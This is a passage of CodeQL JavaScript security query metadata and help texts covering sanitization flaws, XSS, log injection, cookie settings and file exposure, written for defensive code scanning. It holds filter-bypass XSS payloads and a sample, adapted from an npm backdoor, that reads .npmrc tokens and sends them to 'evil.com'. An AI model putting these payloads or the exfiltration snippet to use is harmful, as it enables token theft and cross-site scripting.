    description: "Matching HTML tags using regular expressions is hard to do right,\
      \ and can easily lead to security issues."
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/bad-tag-filter
    tags: |-
      correctness
             security
             external/cwe/cwe-020
             external/cwe/cwe-080
             external/cwe/cwe-116
             external/cwe/cwe-184
             external/cwe/cwe-185
             external/cwe/cwe-186
  queryHelp: |
    # Bad HTML filtering regexp
    It is possible to match some single HTML tags using regular expressions (parsing general HTML using regular expressions is impossible). However, if the regular expression is not written well it might be possible to circumvent it, which can lead to cross-site scripting or other security issues.

    Some of these mistakes are caused by browsers having very forgiving HTML parsers, and will often render invalid HTML containing syntax errors. Regular expressions that attempt to match HTML should also recognize tags containing such syntax errors.


    ## Recommendation
    Use a well-tested sanitization or parser library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.


    ## Example
    The following example attempts to filters out all `<script>` tags.


    ```javascript
    function filterScript(html) {
        var scriptRegex = /<script\b[^>]*>([\s\S]*?)<\/script>/gi;
        var match;
        while ((match = scriptRegex.exec(html)) !== null) {
            html = html.replace(match[0], match[1]);
        }
        return html;
    }

    ```
    The above sanitizer does not filter out all `<script>` tags. Browsers will not only accept `</script>` as script end tags, but also tags such as `</script foo="bar">` even though it is a parser error. This means that an attack string such as `<script>alert(1)</script foo="bar">` will not be filtered by the function, and `alert(1)` will be executed by a browser if the string is rendered as HTML.

    Other corner cases include that HTML comments can end with `--!>`, and that HTML tag names can contain upper case characters.


    ## References
    * Securitum: [The Curious Case of Copy &amp; Paste](https://research.securitum.com/the-curious-case-of-copy-paste/).
    * stackoverflow.com: [You can't parse \[X\]HTML with regex](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags#answer-1732454).
    * HTML Standard: [Comment end bang state](https://html.spec.whatwg.org/multipage/parsing.html#comment-end-bang-state).
    * stackoverflow.com: [Why aren't browsers strict about HTML?](https://stackoverflow.com/questions/25559999/why-arent-browsers-strict-about-html).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
    * Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
    * Common Weakness Enumeration: [CWE-184](https://cwe.mitre.org/data/definitions/184.html).
    * Common Weakness Enumeration: [CWE-185](https://cwe.mitre.org/data/definitions/185.html).
    * Common Weakness Enumeration: [CWE-186](https://cwe.mitre.org/data/definitions/186.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-116/DoubleEscaping.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/DoubleEscaping.bqrs
  metadata:
    name: Double escaping or unescaping
    description: |-
      When escaping special characters using a meta-character like backslash or
                    ampersand, the meta-character has to be escaped first to avoid double-escaping,
                    and conversely it has to be unescaped last to avoid double-unescaping.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/double-escaping
    tags: |-
      correctness
             security
             external/cwe/cwe-116
             external/cwe/cwe-020
  queryHelp: |
    # Double escaping or unescaping
    Escaping meta-characters in untrusted input is an important technique for preventing injection attacks such as cross-site scripting. One particular example of this is HTML entity encoding, where HTML special characters are replaced by HTML character entities to prevent them from being interpreted as HTML markup. For example, the less-than character is encoded as `&lt;` and the double-quote character as `&quot;`. Other examples include backslash-escaping for including untrusted data in string literals and percent-encoding for URI components.

    The reverse process of replacing escape sequences with the characters they represent is known as unescaping.

    Note that the escape characters themselves (such as ampersand in the case of HTML encoding) play a special role during escaping and unescaping: they are themselves escaped, but also form part of the escaped representations of other characters. Hence care must be taken to avoid double escaping and unescaping: when escaping, the escape character must be escaped first, when unescaping it has to be unescaped last.

    If used in the context of sanitization, double unescaping may render the sanitization ineffective. Even if it is not used in a security-critical context, it may still result in confusing or garbled output.


    ## Recommendation
    Use a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation. For URI encoding, you can use the standard `encodeURIComponent` and `decodeURIComponent` functions.

    Otherwise, make sure to always escape the escape character first, and unescape it last.


    ## Example
    The following example shows a pair of hand-written HTML encoding and decoding functions:


    ```javascript
    module.exports.encode = function(s) {
      return s.replace(/&/g, "&amp;")
              .replace(/"/g, "&quot;")
              .replace(/'/g, "&apos;");
    };

    module.exports.decode = function(s) {
      return s.replace(/&amp;/g, "&")
              .replace(/&quot;/g, "\"")
              .replace(/&apos;/g, "'");
    };

    ```
    The encoding function correctly handles ampersand before the other characters. For example, the string `me & "you"` is encoded as `me &amp; &quot;you&quot;`, and the string `&quot;` is encoded as `&amp;quot;`.

    The decoding function, however, incorrectly decodes `&amp;` into `&` before handling the other characters. So while it correctly decodes the first example above, it decodes the second example (`&amp;quot;`) to `"` (a single double quote), which is not correct.

    Instead, the decoding function should decode the ampersand last:


    ```javascript
    module.exports.encode = function(s) {
      return s.replace(/&/g, "&amp;")
              .replace(/"/g, "&quot;")
              .replace(/'/g, "&apos;");
    };

    module.exports.decode = function(s) {
      return s.replace(/&quot;/g, "\"")
              .replace(/&apos;/g, "'")
              .replace(/&amp;/g, "&");
    };

    ```

    ## References
    * OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).
    * npm: [html-entities](https://www.npmjs.com/package/html-entities) package.
    * npm: [js-string-escape](https://www.npmjs.com/package/js-string-escape) package.
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-116/IncompleteHtmlAttributeSanitization.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/IncompleteHtmlAttributeSanitization.bqrs
  metadata:
    name: Incomplete HTML attribute sanitization
    description: |-
      Writing incompletely sanitized values to HTML
                    attribute strings can lead to a cross-site
                    scripting vulnerability.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: high
    id: js/incomplete-html-attribute-sanitization
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
             external/cwe/cwe-020
  queryHelp: "# Incomplete HTML attribute sanitization\nSanitizing untrusted input\
    \ for HTML meta-characters is a common technique for preventing cross-site scripting\
    \ attacks. Usually, this is done by escaping `<`, `>`, `&` and `\"`. However,\
    \ the context in which the sanitized value is used decides the characters that\
    \ need to be sanitized.\n\nAs a consequence, some programs only sanitize `<` and\
    \ `>` since those are the most common dangerous characters. The lack of sanitization\
    \ for `\"` is problematic when an incompletely sanitized value is used as an HTML\
    \ attribute in a string that later is parsed as HTML.\n\n\n## Recommendation\n\
    Sanitize all relevant HTML meta-characters when constructing HTML dynamically,\
    \ and pay special attention to where the sanitized value is used.\n\nAn even safer\
    \ alternative is to design the application so that sanitization is not needed,\
    \ for instance by using HTML templates that are explicit about the values they\
    \ treat as HTML.\n\n\n## Example\nThe following example code writes part of an\
    \ HTTP request (which is controlled by the user) to an HTML attribute of the server\
    \ response. The user-controlled value is, however, not sanitized for `\"`. This\
    \ leaves the website vulnerable to cross-site scripting since an attacker can\
    \ use a string like `\" onclick=\"alert(42)` to inject JavaScript code into the\
    \ response.\n\n\n```javascript\nvar app = require('express')();\n\napp.get('/user/:id',\
    \ function(req, res) {\n\tlet id = req.params.id;\n\tid = id.replace(/<|>/g, \"\
    \"); // BAD\n\tlet userHtml = `<div data-id=\"${id}\">${getUserName(id) || \"\
    Unknown name\"}</div>`;\n\t// ...\n\tres.send(prefix + userHtml + suffix);\n});\n\
    \n```\nSanitizing the user-controlled data for `\"` helps prevent the vulnerability:\n\
    \n\n```javascript\nvar app = require('express')();\n\napp.get('/user/:id', function(req,\
    \ res) {\n\tlet id = req.params.id;\n\tid = id.replace(/<|>|&|\"/g, \"\"); //\
    \ GOOD\n\tlet userHtml = `<div data-id=\"${id}\">${getUserName(id) || \"Unknown\
    \ name\"}</div>`;\n\t// ...\n\tres.send(prefix + userHtml + suffix);\n});\n\n\
    ```\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
    * OWASP [Types of Cross-Site](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\n\
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n\
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-116/IncompleteMultiCharacterSanitization.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/IncompleteMultiCharacterSanitization.bqrs
  metadata:
    name: Incomplete multi-character sanitization
    description: A sanitizer that removes a sequence of characters may reintroduce
      the dangerous sequence.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/incomplete-multi-character-sanitization
    tags: |-
      correctness
             security
             external/cwe/cwe-020
             external/cwe/cwe-080
             external/cwe/cwe-116
  queryHelp: "# Incomplete multi-character sanitization\nSanitizing untrusted input\
    \ is a common technique for preventing injection attacks and other security vulnerabilities.\
    \ Regular expressions are often used to perform this sanitization. However, when\
    \ the regular expression matches multiple consecutive characters, replacing it\
    \ just once can result in the unsafe text reappearing in the sanitized input.\n\
    \nAttackers can exploit this issue by crafting inputs that, when sanitized with\
    \ an ineffective regular expression, still contain malicious code or content.\
    \ This can lead to code execution, data exposure, or other vulnerabilities.\n\n\
    \n## Recommendation\nTo prevent this issue, it is highly recommended to use a\
    \ well-tested sanitization library whenever possible. These libraries are more\
    \ likely to handle corner cases and ensure effective sanitization.\n\nIf a library\
    \ is not an option, you can consider alternative strategies to fix the issue.\
    \ For example, applying the regular expression replacement repeatedly until no\
    \ more replacements can be performed, or rewriting the regular expression to match\
    \ single characters instead of the entire unsafe text.\n\n\n## Example\nConsider\
    \ the following JavaScript code that aims to remove all HTML comment start and\
    \ end tags:\n\n```javascript\n\nstr.replace(/<!--|--!?>/g, \"\");   \n\n```\n\
    Given the input string \"&lt;!&lt;!--- comment ---&gt;&gt;\", the output will\
    \ be \"&lt;!-- comment --&gt;\", which still contains an HTML comment.\n\nOne\
    \ possible fix for this issue is to apply the regular expression replacement repeatedly\
    \ until no more replacements can be performed. This ensures that the unsafe text\
    \ does not re-appear in the sanitized input, effectively removing all instances\
    \ of the targeted pattern:\n\n```javascript\n\nfunction removeHtmlComments(input)\
    \ {  \n  let previous;  \n  do {  \n    previous = input;  \n    input = input.replace(/<!--|--!?>/g,\
    \ \"\");  \n  } while (input !== previous);  \n  return input;  \n}  \n\n```\n\
    \n## Example\nAnother example is the following regular expression intended to\
    \ remove script tags:\n\n```javascript\n\nstr.replace(/<script\\b[^<]*(?:(?!<\\\
    /script>)<[^<]*)*<\\/script>/g, \"\");  \n\n```\nIf the input string is \"&lt;scrip&lt;script&gt;is\
    \ removed&lt;/script&gt;t&gt;alert(123)&lt;/script&gt;\", the output will be \"\
    &lt;script&gt;alert(123)&lt;/script&gt;\", which still contains a script tag.\n\
    \nA fix for this issue is to rewrite the regular expression to match single characters\
    \ (\"&lt;\" and \"&gt;\") instead of the entire unsafe text. This simplifies the\
    \ sanitization process and ensures that all potentially unsafe characters are\
    \ removed:\n\n```javascript\n\nfunction removeAllHtmlTags(input) {  \n  return\
    \ input.replace(/<|>/g, \"\");  \n}\n\n```\nAnother potential fix is to use the\
    \ popular `sanitize-html` npm library. It keeps most of the safe HTML tags while\
    \ removing all unsafe tags and attributes.\n\n```javascript\n\nconst sanitizeHtml\
    \ = require(\"sanitize-html\");\nfunction removeAllHtmlTags(input) {  \n  return\
    \ sanitizeHtml(input);  \n}\n\n```\n\n## Example\nLastly, consider a path sanitizer\
    \ using the regular expression `/\\.\\.\\//`:\n\n```javascript\n\nstr.replace(/\\\
    .\\.\\//g, \"\");  \n\n```\nThe regular expression attempts to strip out all occurences\
    \ of `/../` from `str`. This will not work as expected: for the string `/./.././`,\
    \ for example, it will remove the single occurrence of `/../` in the middle, but\
    \ the remainder of the string then becomes `/../`, which is another instance of\
    \ the substring we were trying to remove.\n\nA possible fix for this issue is\
    \ to use the \"sanitize-filename\" npm library for path sanitization. This library\
    \ is specifically designed to handle path sanitization, and should handle all\
    \ corner cases and ensure effective sanitization:\n\n```javascript\n\nconst sanitize\
    \ = require(\"sanitize-filename\");  \n  \nfunction sanitizePath(input) {  \n\
    \  return sanitize(input);  \n}  \n\n```\n\n## References\n* OWASP Top 10: [A1\
    \ Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).\n* Stack\
    \ Overflow: [Removing all script tags from HTML with JS regular expression](https://stackoverflow.com/questions/6659351/removing-all-script-tags-from-html-with-js-regular-expression).\n\
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n\
    * Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-116/IncompleteSanitization.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/IncompleteSanitization.bqrs
  metadata:
    name: Incomplete string escaping or encoding
    description: |-
      A string transformer that does not replace or escape all occurrences of a
                    meta-character may be ineffective.
    kind: problem
    problem.severity: warning
    security-severity: 7.8
    precision: high
    id: js/incomplete-sanitization
    tags: |-
      correctness
             security
             external/cwe/cwe-020
             external/cwe/cwe-080
             external/cwe/cwe-116
  queryHelp: |
    # Incomplete string escaping or encoding
    Sanitizing untrusted input is a common technique for preventing injection attacks such as SQL injection or cross-site scripting. Usually, this is done by escaping meta-characters such as quotes in a domain-specific way so that they are treated as normal characters.

    However, directly using the string `replace` method to perform escaping is notoriously error-prone. Common mistakes include only replacing the first occurrence of a meta-character, or backslash-escaping various meta-characters but not the backslash itself.

    In the former case, later meta-characters are left undisturbed and can be used to subvert the sanitization. In the latter case, preceding a meta-character with a backslash leads to the backslash being escaped, but the meta-character appearing un-escaped, which again makes the sanitization ineffective.

    Even if the escaped string is not used in a security-critical context, incomplete escaping may still have undesirable effects, such as badly rendered or confusing output.


    ## Recommendation
    Use a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.

    An even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.

    Otherwise, make sure to use a regular expression with the `g` flag to ensure that all occurrences are replaced, and remember to escape backslashes if applicable.


    ## Example
    For example, assume that we want to embed a user-controlled string `accountNumber` into a SQL query as part of a string literal. To avoid SQL injection, we need to ensure that the string does not contain un-escaped single-quote characters. The following function attempts to ensure this by doubling single quotes, and thereby escaping them:


    ```javascript
    function escapeQuotes(s) {
      return s.replace("'", "''");
    }

    ```
    As written, this sanitizer is ineffective: if the first argument to `replace` is a string literal (as in this case), only the *first* occurrence of that string is replaced.

    As mentioned above, the function `escapeQuotes` should be replaced with a purpose-built sanitization library, such as the npm module `sqlstring`. Many other sanitization libraries are available from npm and other sources.

    If this is not an option, `escapeQuotes` should be rewritten to use a regular expression with the `g` ("global") flag instead:


    ```javascript
    function escapeQuotes(s) {
      return s.replace(/'/g, "''");
    }

    ```
    Note that it is very important to include the global flag: `s.replace(/'/, "''")` *without* the global flag is equivalent to the first example above and only replaces the first quote.


    ## References
    * OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).
    * npm: [sqlstring](https://www.npmjs.com/package/sqlstring) package.
    * Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).
    * Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-116/UnsafeHtmlExpansion.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/UnsafeHtmlExpansion.bqrs
  metadata:
    name: Unsafe expansion of self-closing HTML tag
    description: |-
      Using regular expressions to expand self-closing HTML
                    tags may lead to cross-site scripting vulnerabilities.
    kind: problem
    problem.severity: warning
    security-severity: 6.1
    precision: very-high
    id: js/unsafe-html-expansion
    tags: |-
      correctness
             security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: "# Unsafe expansion of self-closing HTML tag\nSanitizing untrusted input\
    \ for HTML meta-characters is a common technique for preventing cross-site scripting\
    \ attacks. But even a sanitized input can be dangerous to use if it is modified\
    \ further before a browser treats it as HTML. A seemingly innocent transformation\
    \ that expands a self-closing HTML tag from `<div attr=\"{sanitized}\"/>` to `<div\
    \ attr=\"{sanitized}\"></div>` may in fact cause cross-site scripting vulnerabilities.\n\
    \n\n## Recommendation\nUse a well-tested sanitization library if at all possible,\
    \ and avoid modifying sanitized values further before treating them as HTML.\n\
    \nAn even safer alternative is to design the application so that sanitization\
    \ is not needed, for instance by using HTML templates that are explicit about\
    \ the values they treat as HTML.\n\n\n## Example\nThe following function transforms\
    \ a self-closing HTML tag to a pair of open/close tags. It does so for all non-`img`\
    \ and non-`area` tags, by using a regular expression with two capture groups.\
    \ The first capture group corresponds to the name of the tag, and the second capture\
    \ group to the content of the tag.\n\n\n```javascript\nfunction expandSelfClosingTags(html)\
    \ {\n\tvar rxhtmlTag = /<(?!img|area)(([a-z][^\\w\\/>]*)[^>]*)\\/>/gi;\n\treturn\
    \ html.replace(rxhtmlTag, \"<$1></$2>\"); // BAD\n}\n\n```\nWhile it is generally\
    \ known regular expressions are ill-suited for parsing HTML, variants of this\
    \ particular transformation pattern have long been considered safe.\n\nHowever,\
    \ the function is not safe. As an example, consider the following string:\n\n\n\
    ```html\n<div alt=\"\n<x\" title=\"/>\n<img src=url404 onerror=alert(1)>\"/>\n\
    \n```\nWhen the above function transforms the string, it becomes a string that\
    \ results in an alert when a browser treats it as HTML.\n\n\n```html\n<div alt=\"\
    \n<x\" title=\"></x\" >\n<img src=url404 onerror=alert(1)>\"/>\n\n```\n\n## References\n\
    * jQuery: [Security fixes in jQuery 3.5.0](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\n\
    * OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
    * OWASP [Types of Cross-Site](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\n\
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-117/LogInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-117/LogInjection.bqrs
  metadata:
    name: Log injection
    description: |-
      Building log entries from user-controlled sources is vulnerable to
                    insertion of forged log entries by a malicious user.
    kind: path-problem
    problem.severity: error
    security-severity: 6.1
    precision: medium
    id: js/log-injection
    tags: |-
      security
             external/cwe/cwe-117
  queryHelp: |
    # Log injection
    If unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.

    Forgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.


    ## Recommendation
    User input should be suitably sanitized before it is logged.

    If the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.

    For log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.


    ## Example
    In the first example, a username, provided by the user, is logged using \`console.info\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \`console.error\`. If a malicious user provides \`username=Guest%0a\[INFO\]+User:+Admin%0a\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \`\[INFO\]+User:+Admin\`.


    ```javascript
    const http = require('http');
    const url = require('url');

    const server = http.createServer((req, res) => {
        let q = url.parse(req.url, true);

        console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is
    })

    server.listen(3000, '127.0.0.1', () => {});

    ```
    In the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.


    ```javascript
    const http = require('http');
    const url = require('url');

    const server = http.createServer((req, res) => {
        let q = url.parse(req.url, true);

        // GOOD: remove newlines from user controlled input before logging
        let username = q.query.username.replace(/\n|\r/g, "");

        console.info(`[INFO] User: ${username}`);
    });

    server.listen(3000, '127.0.0.1', () => {});

    ```

    ## References
    * OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).
    * Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-1275/SameSiteNoneCookie.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-1275/SameSiteNoneCookie.bqrs
  metadata:
    name: Sensitive cookie without SameSite restrictions
    description: |-
      Sensitive cookies where the SameSite attribute is set to "None" can
                    in some cases allow for Cross-Site Request Forgery (CSRF) attacks.
    kind: problem
    problem.severity: warning
    security-severity: 5.0
    precision: medium
    id: js/samesite-none-cookie
    tags: |-
      security
             external/cwe/cwe-1275
  queryHelp: |
    # Sensitive cookie without SameSite restrictions
    Authentication cookies where the SameSite attribute is set to "None" can potentially be used to perform Cross-Site Request Forgery (CSRF) attacks if no other CSRF protections are in place.

    With SameSite set to "None", a third party website may create an authorized cross-site request that includes the cookie. Such a cross-site request can allow that website to perform actions on behalf of a user.


    ## Recommendation
    Set the `SameSite` attribute to `Strict` on all sensitive cookies.


    ## Example
    The following example stores an authentication token in a cookie where the `SameSite` attribute is set to `None`.


    ```javascript
    const http = require('http');

    const server = http.createServer((req, res) => {
        res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly; SameSite=None`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h2>Hello world</h2>');
    });
    ```
    To prevent the cookie from being included in cross-site requests, set the `SameSite` attribute to `Strict`.


    ```javascript
    const http = require('http');

    const server = http.createServer((req, res) => {
        res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly; SameSite=Strict`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h2>Hello world</h2>');
    });
    ```

    ## References
    * MDN Web Docs: [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite).
    * OWASP: [SameSite](https://owasp.org/www-community/SameSite).
    * Common Weakness Enumeration: [CWE-1275](https://cwe.mitre.org/data/definitions/1275.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-134/TaintedFormatString.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-134/TaintedFormatString.bqrs
  metadata:
    name: Use of externally-controlled format string
    description: Using external input in format strings can lead to garbled output.
    kind: path-problem
    problem.severity: warning
    security-severity: 7.3
    precision: high
    id: js/tainted-format-string
    tags: |-
      security
             external/cwe/cwe-134
  queryHelp: |
    # Use of externally-controlled format string
    Functions like the Node.js standard library function `util.format` accept a format string that is used to format the remaining arguments by providing inline format specifiers. If the format string contains unsanitized input from an untrusted source, then that string may contain unexpected format specifiers that cause garbled output.


    ## Recommendation
    Either sanitize the input before including it in the format string, or use a `%s` specifier in the format string, and pass the untrusted data as corresponding argument.


    ## Example
    The following program snippet logs information about an unauthorized access attempt. The log message includes the user name, and the user's IP address is passed as an additional argument to `console.log` to be appended to the message:


    ```javascript
    const app = require("express")();

    app.get("unauthorized", function handler(req, res) {
      let user = req.query.user;
      let ip = req.connection.remoteAddress;
      console.log("Unauthorized access attempt by " + user, ip);
    });

    ```
    However, if a malicious user provides `%d` as their user name, `console.log` will instead attempt to format the `ip` argument as a number. Since IP addresses are not valid numbers, the result of this conversion is `NaN`. The resulting log message will read "Unauthorized access attempt by NaN", missing all the information that it was trying to log in the first place.

    Instead, the user name should be included using the `%s` specifier:


    ```javascript
    const app = require("express")();

    app.get("unauthorized", function handler(req, res) {
      let user = req.query.user;
      let ip = req.connection.remoteAddress;
      console.log("Unauthorized access attempt by %s", user, ip);
    });

    ```

    ## References
    * Node.js Documentation: [util.format](https://nodejs.org/api/util.html#util_util_format_format_args).
    * Common Weakness Enumeration: [CWE-134](https://cwe.mitre.org/data/definitions/134.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-178/CaseSensitiveMiddlewarePath.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-178/CaseSensitiveMiddlewarePath.bqrs
  metadata:
    name: Case-sensitive middleware path
    description: Middleware with case-sensitive paths do not protect endpoints with
      case-insensitive paths.
    kind: problem
    problem.severity: warning
    security-severity: 7.3
    precision: high
    id: js/case-sensitive-middleware-path
    tags: |-
      security
             external/cwe/cwe-178
  queryHelp: |
    # Case-sensitive middleware path
    Using a case-sensitive regular expression path in a middleware route enables an attacker to bypass that middleware when accessing an endpoint with a case-insensitive path. Paths specified using a string are case-insensitive, whereas regular expressions are case-sensitive by default.


    ## Recommendation
    When using a regular expression as a middleware path, make sure the regular expression is case-insensitive by adding the `i` flag.


    ## Example
    The following example restricts access to paths in the `/admin` path to users logged in as administrators:


    ```javascript
    const app = require('express')();

    app.use(/\/admin\/.*/, (req, res, next) => {
        if (!req.user.isAdmin) {
            res.status(401).send('Unauthorized');
        } else {
            next();
        }
    });

    app.get('/admin/users/:id', (req, res) => {
        res.send(app.database.users[req.params.id]);
    });

    ```
    A path such as `/admin/users/45` can only be accessed by an administrator. However, the path `/ADMIN/USERS/45` can be accessed by anyone because the upper-case path doesn't match the case-sensitive regular expression, whereas Express considers it to match the path string `/admin/users`.

    The issue can be fixed by adding the `i` flag to the regular expression:


    ```javascript
    const app = require('express')();

    app.use(/\/admin\/.*/i, (req, res, next) => {
        if (!req.user.isAdmin) {
            res.status(401).send('Unauthorized');
        } else {
            next();
        }
    });

    app.get('/admin/users/:id', (req, res) => {
        res.send(app.database.users[req.params.id]);
    });

    ```

    ## References
    * MDN [Regular Expression Flags](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions#advanced_searching_with_flags).
    * Common Weakness Enumeration: [CWE-178](https://cwe.mitre.org/data/definitions/178.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-200/FileAccessToHttp.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-200/FileAccessToHttp.bqrs
  metadata:
    name: File data in outbound network request
    description: Directly sending file data in an outbound network request can indicate
      unauthorized information disclosure.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.5
    precision: medium
    id: js/file-access-to-http
    tags: |-
      security
             external/cwe/cwe-200
  queryHelp: |
    # File data in outbound network request
    Sending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.


    ## Recommendation
    Examine the highlighted code closely to ensure that it is behaving as intended.


    ## Example
    The following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.


    ```javascript
    var fs = require("fs"),
        https = require("https");

    var content = fs.readFileSync(".npmrc", "utf8");
    https.get({
      hostname: "evil.com",
      path: "/upload",
      method: "GET",
      headers: { Referer: content }
    }, () => { });

    ```

    ## References
    * ESLint Blog: [Postmortem for Malicious Packages Published on July 12th, 2018](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes).
    * OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).
    * OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).
    * Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-200/PrivateFileExposure.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-200/PrivateFileExposure.bqrs
  metadata:
    name: Exposure of private files
    description: |-
      Exposing a node_modules folder, or the project folder to the public, can cause exposure
                    of private information.
    kind: problem
    problem.severity: warning
    security-severity: 6.5
    id: js/exposure-of-private-files
    tags: |-
      security
             external/cwe/cwe-200
             external/cwe/cwe-219
             external/cwe/cwe-548
    precision: high
  queryHelp: |
    # Exposure of private files
    Libraries like `express` provide easy methods for serving entire directories of static files from a web server. However, using these can sometimes lead to accidental information exposure. If for example the `node_modules` folder is served, then an attacker can access the `_where` field from a `package.json` file, which gives access to the absolute path of the file.


    ## Recommendation
    Limit which folders of static files are served from a web server.


    ## Example
    In the example below, all the files from the `node_modules` are served. This allows clients to easily access all the files inside that folder, which includes potentially private information inside `package.json` files.


    ```javascript

    var express = require('express');

    var app = express();

    app.use('/node_modules', express.static(path.resolve(__dirname, '../node_modules')));
    ```
    The issue has been fixed below by only serving specific folders within the `node_modules` folder.


    ```javascript

    var express = require('express');

    var app = express();

    app.use("jquery", express.static('./node_modules/jquery/dist'));
